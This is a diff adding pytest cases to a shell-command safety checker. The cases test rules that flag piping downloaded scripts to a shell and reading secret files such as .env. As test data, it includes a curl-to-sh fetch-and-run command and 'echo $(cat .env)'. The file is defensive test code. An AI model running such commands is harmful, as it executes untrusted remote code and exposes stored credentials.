@@ -57,3 +57,19 @@ def test_allows_safe(cmd):
 def test_severity_of_pipe_to_shell():
     f = [x for x in commands.check("curl http://example.com/x.sh | sh") if x.rule == "pipe_to_shell"]
     assert f[0].severity == "CRITICAL"
+
+
+@pytest.mark.parametrize("cmd", [
+    "echo .env >> .gitignore",
+    "git check-ignore .env",
+    "ls -la .env",
+    "test -f .env && echo present",
+    "python3 -c \"print(open('README.md').read())\"",
+    "python3 -c 'import os; print(os.getenv(\"HOME\"))'",
+])
+def test_mentions_without_reading_are_allowed(cmd):
+    assert not [f for f in commands.check(cmd) if f.rule == "reads_secret_file"]
+
+
+def test_echo_with_substitution_still_reads():
+    assert "reads_secret_file" in rules("echo $(cat .env)")
